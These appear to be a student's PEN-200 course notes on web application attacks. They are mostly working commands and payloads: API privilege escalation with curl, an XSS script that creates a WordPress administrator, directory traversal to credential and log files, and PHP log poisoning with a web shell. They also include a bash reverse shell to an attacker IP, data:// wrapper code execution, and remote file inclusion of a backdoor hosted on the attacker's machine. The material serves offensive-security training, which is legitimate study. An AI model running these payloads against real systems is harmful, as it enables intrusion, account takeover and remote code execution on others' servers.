
# Enumeration

Fingerprint Web Servers with Nmap

```shell
sudo nmap -p80 -sV 192.168.50.20
sudo nmap -p80 --script=http-enum 192.168.50.20
```

[https://www.wappalyzer.com/](https://www.wappalyzer.com/)

```shell
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```

Simply enter **about:config** in the address bar. Firefox will present a warning, but we can proceed by clicking _I accept the risk!_. Finally, search for "network.captive-portal-service.enabled" and double-click it to change the value to "false". This will prevent these messages from appearing in the proxy history.

```shell
cat /etc/hosts

.....
192.168.50.16 offsecwp
```

```shell
cat /usr/share/wordlist/rockyou.txt
```

```shell
echo "{GOBUSTER}/v1\n{GOBUSTER}/v2" > pattern.txt

gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern.txt

curl -i http://192.168.50.16:5002/users/v1

gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt

curl -i http://192.168.50.16:5002/users/v1/admin/password

curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register

curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register

curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}' --proxy 127.0.0.1:8080
```

# XSS

FireFox Console
```
CTRL + SHIFT + K
```

XSS Payloads:
```
< > ' " { } ;
```

The Secure[3](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/cross-site-scripting-44558/basic-xss-44524#fn-local_id_2351-3) flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in clear text and captured over the network.

The HttpOnly[4](https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516/cross-site-scripting-44558/basic-xss-44524#fn-local_id_2351-4) flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.

```JavaScript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

```JavaScript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

[JS Compress](https://jscompress.com/)

```JavaScript
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

```bash
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,...,115,41,59))</script>" --proxy 127.0.0.1:8080
```

# Directory Traversal

```powershell
C:\Windows\System32\drivers\etc\hosts
```

Internet Information Services (IIS)
```Powershell
C:\inetpub\logs\LogFiles\W3SVC1\
C:\inetpub\wwwroot\web.config
```

Try both
```
/..
..\
without C:\
```

XAMPP Apache logs on Windows
```Powershell
C:\xampp\apache\logs\access.log
```


PHP Command Injection One Liner
```PHP
<?php echo system($_GET['cmd']); ?>


../../../../../../../../../var/log/apache2/access.log&cmd-ps


bash -c "bash -i >& /dev/tcp/[remote.attacker.ip]/4444 0>&1"
```

## PHP Wrappers

```shell
curl http://mountaindesserts.com/meteor/index.php?page=admin.php

curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php

curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php

echo "PCFE...K==" | base64 -d
```

When cannot poison a local file with PHP Code, use the **data://** php wrapper:
```shell
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"

echo -n '<?php echo system($_GET["cmd"]);?>' | base64

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```
the **data://** wrapper will not work in a default PHP installation. To exploit it, the [_allow_url_include_](https://portal.offsec.com/courses/pen-200-44065/learning/common-web-application-attacks-44643/file-inclusion-vulnerabilities-44691/php-wrappers-44647#fn-local_id_382-7) setting needs to be enabled.

## Remote File Inclusion (RFI)

Kali included web shells:
```shell
ls /usr/share/webshells/php/

cat simple-backdoor.php

python3 -m http.server 80

curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"```